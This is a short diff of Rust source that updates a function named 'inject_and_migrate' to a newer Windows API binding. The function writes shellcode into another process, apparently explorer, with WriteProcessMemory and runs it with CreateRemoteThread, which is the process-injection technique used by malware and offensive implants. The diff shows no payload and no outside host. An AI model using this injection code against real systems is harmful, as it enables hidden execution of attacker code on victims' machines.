@@ -1,4 +1,3 @@
-use core::ffi::c_void;
 use std::{mem, ptr};
 use windows::Win32::Foundation::CHAR;
 use windows::Win32::System::Diagnostics::Debug::WriteProcessMemory;
@@ -77,9 +76,8 @@ pub fn inject_and_migrate(shellcode: &[u8], target_process: &str) {
         WriteProcessMemory(
             explorer_handle,
             base_address,
-            shellcode.as_ptr() as *const c_void,
-            shellcode.len(),
-            ptr::null_mut(),
+            shellcode,
+            None,
         )
     };
     if !write_result.as_bool() {
@@ -93,12 +91,12 @@ pub fn inject_and_migrate(shellcode: &[u8], target_process: &str) {
     if unsafe {
         CreateRemoteThread(
             explorer_handle,
-            ptr::null(),
+            None,
             0,
             start_address_option,
             ptr::null(),
             0,
-            ptr::null_mut(),
+            None,
         )
     }
     .is_err()
